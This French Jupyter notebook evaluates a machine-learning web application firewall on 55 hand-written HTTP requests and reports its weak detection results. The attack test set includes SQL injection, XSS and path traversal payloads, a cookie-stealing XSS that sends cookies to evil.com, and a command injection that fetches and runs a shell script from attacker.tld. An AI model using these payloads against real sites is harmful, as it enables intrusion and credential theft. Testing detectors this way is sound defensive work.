## Imports et chargement du modèle

In [7]:
import sys
import os
sys.path.append("..")

import joblib
import pandas as pd
from preprocessing import build_text, champs_from_http

model = joblib.load("../models/waf_tfidf.joblib")

# Patch complet inter-versions scikit-learn pour CalibratedClassifierCV et ses plis internes
clf = model.steps[-1][1] if hasattr(model, "steps") else model
if not hasattr(clf, "estimator") and hasattr(clf, "base_estimator"):
    clf.estimator = clf.base_estimator

for cc in getattr(clf, "calibrated_classifiers_", []):
    if not hasattr(cc, "estimator") and hasattr(cc, "base_estimator"):
        cc.estimator = cc.base_estimator

# Chargement dynamique du seuil s'il a été généré par Mathéo/Célian
seuil_path = "../models/seuil.txt"
if os.path.exists(seuil_path):
    with open(seuil_path, "r") as f:
        SEUIL = float(f.read().strip())
else:
    SEUIL = 0.5

print(f"Modèle chargé. Seuil de décision appliqué : {SEUIL}")

Modèle chargé. Seuil de décision appliqué : 0.24576028783698792


## Fonction de test alignée sur l'API FastAPI

In [8]:
def tester(method, target, body="", headers=None):
    h = {
        "host": "test-site.com",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) Firefox/120.0",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "fr-FR,fr;q=0.9,en;q=0.8",
    }
    h.update(headers or {})
    champs = champs_from_http(method, target, "HTTP/1.1", h, body)
    texte = build_text(champs)
    p = model.predict_proba([texte])[0, 1]
    return round(float(p), 4), "BLOCK" if p >= SEUIL else "ALLOW"

## Jeu de 55 requêtes écrites à la main (22 légitimes, 33 attaques)

In [9]:
cas = [
    # === 22 REQUÊTES LÉGITIMES (navigation normale & cas limites WordPress) ===
    ("légitime", "GET",  "/", ""),
    ("légitime", "GET",  "/blog/", ""),
    ("légitime", "GET",  "/blog/index.php/2020/03/22/un-article/", ""),
    ("légitime", "GET",  "/blog/index.php/page/2/", ""),
    ("légitime", "GET",  "/blog/category/cybersecurite/", ""),
    ("légitime", "GET",  "/blog/tag/machine-learning/", ""),
    ("légitime", "GET",  "/blog/?s=recette+de+crepes", ""),
    ("légitime", "GET",  "/blog/?s=l'été+à+paris", ""),                        # Piège : apostrophe légitime
    ("légitime", "GET",  "/blog/?s=comment+utiliser+select+en+sql", ""),       # Piège : mot-clé SQL dans une recherche
    ("légitime", "GET",  "/blog/?p=42&preview=true", ""),
    ("légitime", "GET",  "/wp-content/themes/twentytwenty/style.css?ver=1.2", ""),
    ("légitime", "GET",  "/wp-includes/js/jquery/jquery.min.js?ver=3.7.1", ""),
    ("légitime", "GET",  "/wp-content/uploads/2026/05/photo-vacances.jpg", ""),
    ("légitime", "GET",  "/wp-json/wp/v2/posts?per_page=10&page=1", ""),
    ("légitime", "GET",  "/feed/", ""),
    ("légitime", "POST", "/blog/wp-comments-post.php", "comment=Super+article+merci+beaucoup+%21&author=Nolhan&email=nolhan%40example.fr&comment_post_ID=12"),
    ("légitime", "POST", "/blog/wp-comments-post.php", "comment=J'adore+cette+approche,+c'est+top.&author=Claire&email=claire%40test.fr"),
    ("légitime", "POST", "/blog/wp-login.php", "log=jean&pwd=MonMotDePasse2024%21&wp-submit=Se+connecter"),
    ("légitime", "POST", "/wp-admin/admin-ajax.php", "action=heartbeat&_nonce=a1b2c3d4e5&screen_id=dashboard"),
    ("légitime", "GET",  "/wp-admin/edit.php?post_type=page", ""),
    ("légitime", "POST", "/contact/", "nom=Dupont&sujet=Demande+d'information&message=Bonjour,+pouvez-vous+me+recontacter+%3F"),
    ("légitime", "GET",  "/blog/?utm_source=newsletter&utm_medium=email&utm_campaign=printemps_2026", ""),

    # === 33 ATTAQUES (SQLi, XSS, Traversal, CMDi, Fuzzing, Obfuscation) ===
    # SQL Injection (7)
    ("sqli",      "GET",  "/?id=1' union select 1,2,3--", ""),
    ("sqli",      "GET",  "/?id=1' or '1'='1", ""),
    ("sqli",      "GET",  "/?id=1 and sleep(5)", ""),
    ("sqli",      "GET",  "/blog/?p=1; DROP TABLE wp_users--", ""),
    ("sqli",      "GET",  "/?cat=1 UNION ALL SELECT user_login,user_pass FROM wp_users#", ""),
    ("sqli",      "POST", "/blog/wp-login.php", "log=admin'--&pwd=x"),
    ("sqli",      "POST", "/blog/wp-login.php", "log=admin' OR 1=1#&pwd=anything"),

    # XSS (6)
    ("xss",       "GET",  "/blog/?s=<script>alert(1)</script>", ""),
    ("xss",       "GET",  "/blog/?s=<img src=x onerror=alert(document.cookie)>", ""),
    ("xss",       "GET",  "/blog/?s=\"'><svg/onload=alert('XSS')>", ""),
    ("xss",       "GET",  "/blog/?s=javascript:alert(1)", ""),
    ("xss",       "POST", "/blog/wp-comments-post.php", "comment=<script>fetch('http://evil.com/?c='+document.cookie)</script>&author=hacker"),
    ("xss",       "GET",  "/blog/?author=<body onload=alert(1)>", ""),

    # Path Traversal / LFI (5)
    ("traversal", "GET",  "/?file=../../../../etc/passwd", ""),
    ("traversal", "GET",  "/?page=..%2f..%2f..%2fetc%2fpasswd", ""),
    ("traversal", "GET",  "/wp-content/plugins/revslider/temp/update_extract/revslider/db.php?img=../../wp-config.php", ""),
    ("traversal", "GET",  "/?template=....//....//....//windows/win.ini", ""),
    ("traversal", "GET",  "/?doc=/proc/self/environ", ""),

    # Command Injection (5)
    ("cmdi",      "GET",  "/?ip=127.0.0.1;cat /etc/passwd", ""),
    ("cmdi",      "GET",  "/?host=x|whoami", ""),
    ("cmdi",      "GET",  "/?ping=8.8.8.8 && id", ""),
    ("cmdi",      "POST", "/wp-admin/admin-ajax.php", "action=ping&target=127.0.0.1`uname -a`"),
    ("cmdi",      "GET",  "/?cmd=$(curl http://attacker.tld/shell.sh | sh)", ""),

    # Scanning / Verb Tampering (3)
    ("scan",      "GET",  "/.env", ""),
    ("scan",      "GET",  "/.git/config", ""),
    ("verb",      "TRACE", "/", ""),

    # Attaques obfusquées (7)
    ("sqli obf",  "GET",  "/?id=1'/**/UnIoN/**/SeLeCt/**/1,2--", ""),
    ("sqli obf",  "GET",  "/?id=1%2527%2520union%2520select%25201--", ""),       # Double encodage URL
    ("sqli obf",  "GET",  "/?id=1'+/*!50000UNION*/+/*!50000SELECT*/+1,2,3--", ""),  # Commentaire conditionnel MySQL
    ("sqli obf",  "GET",  "/?id=1%09union%0aselect%0d1,2--", ""),                  # Tabulations / retours chariot
    ("xss obf",   "GET",  "/?q=<ScRiPt>alert(1)</sCrIpT>", ""),
    ("xss obf",   "GET",  "/?q=<svg/onload=alert(1)>", ""),
    ("xss obf",   "GET",  "/?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E", ""),
]

res = pd.DataFrame(
    [(cat, m, c, b, *tester(m, c, b)) for cat, m, c, b in cas],
    columns=["attendu", "méthode", "cible", "body", "proba", "décision"],
)
res

,attendu,méthode,cible,body,proba,décision
0,légitime,GET,/,,0.0015,ALLOW
1,légitime,GET,/blog/,,0.0018,ALLOW
2,légitime,GET,/blog/index.php/2020/03/22/un-article/,,0.0182,ALLOW
3,légitime,GET,/blog/index.php/page/2/,,0.0030,ALLOW
4,légitime,GET,/blog/category/cybersecurite/,,0.0030,ALLOW
5,légitime,GET,/blog/tag/machine-learning/,,0.0149,ALLOW
6,légitime,GET,/blog/?s=recette+de+crepes,,0.0010,ALLOW
7,légitime,GET,/blog/?s=l'été+à+paris,,0.0016,ALLOW
8,légitime,GET,/blog/?s=comment+utiliser+select+en+sql,,0.0421,ALLOW
9,légitime,GET,/blog/?p=42&preview=true,,0.0006,ALLOW


## Analyse des taux de réussite et inspection des erreurs

In [10]:
res["correct"] = ((res["attendu"] == "légitime") & (res["décision"] == "ALLOW")) | \
                 ((res["attendu"] != "légitime") & (res["décision"] == "BLOCK"))

print("=== Taux de détection / précision par catégorie ===")
print(res.groupby("attendu")["correct"].mean().round(3))

print(f"\nScore global sur les {len(res)} requêtes manuelles : {res['correct'].mean():.1%}")
print(f"Faux positifs (légitimes bloquées) : {len(res[(res['attendu']=='légitime') & (res['décision']=='BLOCK')])} / {len(res[res['attendu']=='légitime'])}")
print(f"Faux négatifs (attaques passées)   : {len(res[(res['attendu']!='légitime') & (res['décision']=='ALLOW')])} / {len(res[res['attendu']!='légitime'])}")

print("\n=== Détail des erreurs à analyser pour le rapport ===")
res[~res["correct"]][["attendu", "méthode", "cible", "body", "proba", "décision"]]

=== Taux de détection / précision par catégorie ===
attendu
cmdi         0.200
légitime     0.773
scan         0.000
sqli         0.571
sqli obf     0.500
traversal    0.200
verb         0.000
xss          0.333
xss obf      0.000
Name: correct, dtype: float64

Score global sur les 55 requêtes manuelles : 49.1%
Faux positifs (légitimes bloquées) : 5 / 22
Faux négatifs (attaques passées)   : 23 / 33

=== Détail des erreurs à analyser pour le rapport ===


,attendu,méthode,cible,body,proba,décision
15,légitime,POST,/blog/wp-comments-post.php,comment=Super+article+merci+beaucoup+%21&autho...,0.9991,BLOCK
16,légitime,POST,/blog/wp-comments-post.php,"comment=J'adore+cette+approche,+c'est+top.&aut...",0.9883,BLOCK
17,légitime,POST,/blog/wp-login.php,log=jean&pwd=MonMotDePasse2024%21&wp-submit=Se...,0.9434,BLOCK
18,légitime,POST,/wp-admin/admin-ajax.php,action=heartbeat&_nonce=a1b2c3d4e5&screen_id=d...,0.9194,BLOCK
20,légitime,POST,/contact/,nom=Dupont&sujet=Demande+d'information&message...,0.9986,BLOCK
23,sqli,GET,/?id=1' or '1'='1,,0.0760,ALLOW
25,sqli,GET,/blog/?p=1; DROP TABLE wp_users--,,0.0418,ALLOW
26,sqli,GET,"/?cat=1 UNION ALL SELECT user_login,user_pass ...",,0.0009,ALLOW
29,xss,GET,/blog/?s=<script>alert(1)</script>,,0.0270,ALLOW
30,xss,GET,/blog/?s=<img src=x onerror=alert(document.coo...,,0.0153,ALLOW


## Influence du `Host` et du `Referer`

In [11]:
print("=== Test de sensibilité aux en-têtes Host et Referer ===")
headers_tests = [
    {},
    {"host": "localhost"},
    {"host": "127.0.0.1:8080"},
    {"referer": "http://test-site.com/blog/"},
    {"referer": "http://localhost/blog/"},
    {"referer": "http://malicious-site.tld/"},
]

for h in headers_tests:
    proba, decision = tester("GET", "/blog/index.php/page/2/", headers=h)
    print(f"Headers: {str(h):45s} -> proba={proba:.4f} | {decision}")

=== Test de sensibilité aux en-têtes Host et Referer ===
Headers: {}                                            -> proba=0.0030 | ALLOW
Headers: {'host': 'localhost'}                         -> proba=0.0051 | ALLOW
Headers: {'host': '127.0.0.1:8080'}                    -> proba=0.0292 | ALLOW
Headers: {'referer': 'http://test-site.com/blog/'}     -> proba=0.0010 | ALLOW
Headers: {'referer': 'http://localhost/blog/'}         -> proba=0.0006 | ALLOW
Headers: {'referer': 'http://malicious-site.tld/'}     -> proba=0.0081 | ALLOW
